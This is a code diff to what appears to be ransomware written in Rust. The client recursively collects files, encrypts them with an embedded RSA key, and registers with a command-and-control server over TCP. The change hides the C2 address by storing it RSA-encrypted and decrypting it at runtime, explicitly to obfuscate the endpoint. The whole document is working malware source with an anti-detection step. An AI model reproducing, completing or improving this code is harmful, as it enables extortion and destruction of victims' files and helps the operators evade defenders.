@@ -1,8 +1,10 @@
 use comms::{generate_ucid, Message};
 use filesystem::recurse_directory_with_channel;
 use openssl::rsa;
+use openssl::rsa::Padding;
 use std::env;
 use std::io;
+use std::path::PathBuf;
 use std::process::exit;
 use std::thread::sleep;
 use std::time::Duration;
@@ -18,8 +20,6 @@ mod encryptor;
 mod filesystem;
 
 const THREADS: i32 = 8;
-// todo obfuscate this value (encrypt with server private key?)
-const SERVER_IP: &'static str = "127.0.0.1:4200";
 
 #[allow(dead_code)]
 #[cfg(unix)]
@@ -28,6 +28,14 @@ const PUB_KEY: &[u8] = include_bytes!("../pub.key");
 #[allow(dead_code)]
 #[cfg(windows)]
 const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");
+
+#[allow(dead_code)]
+#[cfg(unix)]
+const SERVER_IP: &[u8] = include_bytes!("../ip-port.bin");
+
+#[allow(dead_code)]
+#[cfg(windows)]
+const SERVER_IP: &[u8] = include_bytes!("..\\ip-port.bin");
 
 #[tokio::main]
 async fn main() {
@@ -87,7 +95,8 @@ async fn main() {
     let (s, r) = crossbeam_channel::unbounded();
 
     event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");
-    recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);
+    //recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);
+    recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);
 
     if !disable_cryptography {
         let mut threads = Vec::new();
@@ -118,6 +127,16 @@ async fn main() {
     // Encrypt the data and discard its length
     let _ = encryptor.encrypt(&key, &mut encrypted).unwrap();
 
+    let mut output_buff = vec![0u8; SERVER_IP.len()];
+
+    let len = p_key
+        .rsa()
+        .unwrap()
+        .public_decrypt(SERVER_IP, &mut output_buff, Padding::PKCS1)
+        .unwrap();
+    let ip =
+        String::from_utf8(output_buff[0..len].to_vec()).expect("C2 Endpoint Deobfuscation Error");
+
     let mut ucid = generate_ucid().unwrap();
 
     key.zeroize(); // zero out key, not needed anymore
@@ -125,7 +144,7 @@ async fn main() {
     event!(Level::INFO, "-- REACHED STAGE: Networking --");
     let mut register_blob = comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
 
-    let addr = SERVER_IP.parse().unwrap();
+    let addr = ip.parse().unwrap();
 
     let socket = TcpSocket::new_v4().unwrap();
     let mut stream = socket.connect(addr).await.unwrap();
